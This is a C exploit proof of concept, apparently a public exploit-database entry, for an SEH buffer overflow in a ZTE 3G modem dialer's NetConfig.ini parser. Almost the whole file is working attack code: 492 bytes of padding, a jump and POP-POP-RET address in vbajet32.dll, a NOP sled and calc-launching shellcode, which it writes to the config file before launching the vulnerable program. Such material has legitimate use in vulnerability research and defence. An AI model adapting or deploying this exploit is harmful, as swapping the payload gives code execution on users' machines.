/**
 * @Exploit title: SEH bufferoverflow
 * @Date: 10/03/2013
 * @Vendor HomePage: http://wwwen.zte.com.en
 * @Version: PCW_MATMARV1.0.0B02
 * @Vuln Type: Local
 * @Email: sam.rad@hotmail.fr
 * @Software URL: http://www.2shared.com/file/s1iYc7nW/Internet_Haut_Dbit_Mobile.html
 * @Author: Samir Radouane
 **/

#include <stdio.h>
#include <stdlib.h>

char header[]     = "[Menara 3G PrP]\n" //Header file this is the header file of Netconfig.ini
                    "Name=";

char buffer[]  =    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; //492 bytes to trigger the vulnerability

char jmp[]        = "\xeb\x40\x90\x90"; //Jmp 28 byte to shellcode 90 90 for padding [ this is our address  ]

char modaddress[] = "\x6a\x19\x9a\x0f"; //POP, POP, RETN vbajet32.dll in little-endian 0x0f 9a 19 6A

char nop[]      =   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                    "\x90\x90\x90"; //NOP no operation for our shellcode
                    
char shellcode[]  = "\xb8\xff\xef\xff\xff\xf7\xd0\x2b\xe0\x55"
                    "\x8b\xec\x33\xff\x57\x83\xec\x04\xc6\x45"
                    "\xf8\x63\xc6\x45\xf9\x61\xc6\x45\xfa\x6c"
                    "\xc6\x45\xfb\x63\x8d\x45\xf8\x50\xbb\xc7"
                    "\x93\xbf\x77\xff\xd3"; // Calc Shellcode 45 bytes

int main(void)
{
    FILE *file = fopen("C:\\Docume~1\\admin\\Bureau\\MarocT~1\\NetConfig.ini", "w"); //to Open the vulnerable file in write mode
    if (file != NULL)
    {
             fputs(header, file); //put the crafted data to the file...
             fputs(buffer, file);
             fputs(jmp, file);
             fputs(modaddress, file);
             fputs(nop, file);
             fputs(shellcode, file);
    }
    fclose(file);
    system("start C:\\Docume~1\\admin\\Bureau\\MarocT~1\\uimain.exe"); //start the application
    printf("Exploit Created\n");
    system("pause");
    return 0;
}
